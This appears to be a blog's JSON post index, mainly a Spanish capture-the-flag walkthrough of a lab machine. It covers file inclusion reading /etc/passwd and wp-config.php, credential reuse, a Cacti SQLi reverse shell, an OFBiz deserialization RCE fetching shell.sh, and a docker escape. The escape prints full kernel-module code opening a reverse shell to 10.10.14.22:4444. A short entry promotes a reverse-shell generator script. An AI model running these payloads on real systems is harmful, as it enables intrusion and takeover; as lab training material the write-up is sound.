Primeramente probaremos a ver si tenemos capacidad de directory listing en /wp-content/plugins/ y efectivamente la tenemos lo cual es poco habitual  Con esto en mano buscamos el unico plugin en searchsploit por si hubiese alguna vulnerabilidad asociada y encontramos un RFI -&gt; Remote File Inclusion  Si lo examinamos podemos ver como funciona  Teniendo esto en cuenta listamos archivos de utilidad como pueden ser el /etc/passwd para ver los usuarios existentes  ( Ya que se trata de un RFI si probamos a cargar un archivo php de nuesta maquina vemos que no nos lo interpreta asi que solo podremos listar contenido de la propia maquina)  Tambien podemos listar el archivo /proc/net/tcp para ver los puertos abiertos  En este caso lo hago con curl para guardar el resultado en un archivo  Y con la herramienta que creé y que está en mi github: https://github.com/whitexnd/OpenPorts podemos ver que puertos tiene abiertos internamente en este caso el 80 no sale representado lo cual es un poco raro y vemos tambien el puerto 8443 el cual tambien es un poco raro  Tambien listamos el archivo /etc/apache2/sites-enabled/000-default.conf el cual contiene información de la web y vemos que hay un subdomnio, lo añadimos de nuevo al fichero /etc/hosts  Y lo buscamos a ver si hubiese contenido, en este caso vemos Cacti que parece ser una utilidad de graficos según google  Tambien aprovechamos para ver el fichero wp-config.php el cual suele contener el usuario y contraseña empleados en la base de datos de wordpress  Probamos a logearnos con admin y la credencial que vimos por si se reutilizara  Y logramos acceso a cacti  Buscamos en searchsploit por si hubiera algun tipo de exploit para la versión de cacti que utiliza la maquina  Mediante una inyección sql (SQLi) busca entablar una reverse shell, por lo que lo usaremos para automatizar este proceso  Una vez dentro como el user www-data vemos que hay otro usuario marcus al cual nos interesa pivotar para poder ver su flag, listamos su home y vemos algo raro  Hay una carpeta oculta .backup a la cual no tenemos acceso  Por lo que en este punto probamos a grepear recursivamente la cadena marcus en algun fichero en /etc y encontramos que algo menciona a un script en shell dentro de la carpeta que vimos antes  Tratamos de hacerle un cat para ver si tuviesemos acceso a su contenido y vemos un usuario y contraseña  La probamos por si se reutilizase  Y ya unicamente listariamos la flag user.txt de su direcctorioRoot  Examinamos nuestra ip por si se estuviesemos en un contenedor y en este caso no  Viendo de nuevo el direcctorio personal vemos un archivo note.txt que habla de una imagen docker  Por lo que pensando en esto y sin la capacidad de ver las imagenes de docker activas buscamos algun puerto más abierto y volvemos a ver el 8443  Ahora mediante SSH realizamos un Local Port Forwarding para que nuestro puerto local sea el mismo que el de la victima y podamos verlossh marcus@10.10.10.238 -L 8443:127.0.0.1:8443  Y navegando vemos que tenemos acceso  Hacemos uso de wfuzz para encontrar direcctorioswfuuz\t-c -&gt; Formato colorizado\t-t -&gt; Cantidad de hilos\t--hc=404 -&gt; Para que nos oculte las peticiones que devuelvan el estado 404\t-w -&gt; Indicarle el diccionario  Vemos varios que nos dan un codigo 302 el cual es un redirect  Ponemos uno cualquiera y nos lleva a la siguiente web  Viendo el footer vemos que emplea Apache OFBiz  Y buscando exploit relacionados a esto encontramos un script en shell el cual nos permite RCE -&gt; Remote Command Execution  Según el script se trata de un ataque de Insecure Deserialization podríamos ejecutar el script pasandole los argumentos y obtendríamos acceso, en este caso lo he ido haciendo sentencia a sentencia  Primero cargando mi payload en un fichero que posteriormente la victima se descargará  Descargarnos el archivo indicado en el script para generar JAR pyaloads  Generamos uno con la siguiente sentencia que lo que hace es descargarse un recurso de nuestra maquina y guardarlo en la ruta /tmp, todo esto lo convertimos a base64 y le quitamos el salto de linea del final  Iniciamos el servidor web desde el que compartiremos nuestro shell.sh malicioso  Hacemos una petición curl como se especifica en el script junto al payload jar que hemos creado  Y vemos que efectivamente se ha ejecutado ya que hemos recibido una petición GET al archivo shell.sh  Creamos el ultimo payload para que interprete el archivo que guardó en /tmp  Hacemos el curl  Y vemos que por el puerto en el que estabamos en escucha nos llega la reverse shell  Vemos nuestra ip para ver si estamos en un docker y efectivamente  Nos descargamos LinPeas, el cual es una utilidad de reconocimineto del sistema que podemos encontrar en github y nos la compartimos con un servidor web python como en el anterior ejemplo para descargarnoslo en la maquina victima, despues le damos permisos de ejecución y lo ejecutamos. Atendiendo al resultado vemos que está asignada la capabilitie cap_sys_module  Con el siguiente comando podemos listar las capabilities  Buscando en google encontramos esta pagina la cual nos explica bastante bien como funciona y como abusar de la capabilitiehttps://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd  En este caso tenemos que crearnos el siguiente archivo con nuestra ip y puerto para intentar cargar un modulo kernel que nos entable una reverse shell#include &lt;linux/kmod.h&gt;#include &lt;linux/module.h&gt;MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"AttackDefense\");MODULE_DESCRIPTION(\"LKM reverse shell module\");MODULE_VERSION(\"1.0\");char* argv[] = {\"/bin/bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/10.10.14.22/4444 0&gt;&amp;1\", NULL};static char* envp[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};static int __init reverse_shell_init(void) {\treturn call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);}static void __exit reverse_shell_exit(void) {\tprintk(KERN_INFO \"Exiting\\n\");}module_init(reverse_shell_init);module_exit(reverse_shell_exit);  Y tambien un makefile con las siguientes instrucciones:obj-m +=reverse-shell.oall:\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean:\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean  Una vez con estos dos  Ejecutamos el comando make  Nos ponemos en escucha  Y cargamos en el kernel el fichero reverse-shell.ko que nos generó  Y vualá obtenemos una sesión como root en la maquina victima  Y ya podemos listar la flag  fc516fd7b8d8b3ccdeedc9ad2860e821192a35c9"
  },
  
  {
    "title": "EvilShell",
    "url": "/posts/EvilShell/",
    "categories": "Personal Scripts",
    "tags": "Scripts",
    "date": "2022-11-23 12:48:00 +0100",
    





    
    "snippet": "  EvilShell its a bash script that simplifies the creation of reverse shellsInstalationgit clone https://github.com/whitexnd/EvilShellUsageBy default takes the ip from the iface tun0 and the port 4...",
    "content": "  EvilShell its a bash script that simplifies the creation of reverse shellsInstalationgit clone https://github.com/whitexnd/EvilShellUsageBy default takes the ip from the iface tun0 and the port 443You can specify the ip with -i and the port with -palso you can select the shell with -s parameterIf you want to encode the payload you can use:-e &lt;encoder&gt;Current encoders are b64 (base64) and urlOptionalI suggest you to add it into your $PATH with the following commands:      chmod +x evilshell.sh        sudo mv evilshell.sh /bin/evilshell  Then u can use it like this:  evilshell -s python"
  }
  
]

